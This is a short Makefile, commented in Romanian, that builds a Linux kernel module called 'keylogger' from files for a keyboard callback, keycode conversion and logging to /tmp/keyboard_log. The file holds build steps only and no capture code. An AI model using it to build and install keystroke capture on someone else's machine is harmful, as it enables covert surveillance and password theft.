obj-m := keylogger.o

# Lista fișierelor sursă pentru modul
keylogger-objs := init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o

COMPILE_DIR := $(PWD)
KDIR := /lib/modules/$(shell uname -r)/build

# Adăugare userspace
all: module 

module:
	$(MAKE) -C $(KDIR) M=$(COMPILE_DIR) modules

clean:
	rm -f *.o *.ko *.mod *.cmd .*.cmd *.symvers *.markers keylogger.mod.c modules.order *.o.*
	sudo rm -f /tmp/keyboard_log
	sudo rm -f /tmp/client*

.PHONY: all clean module 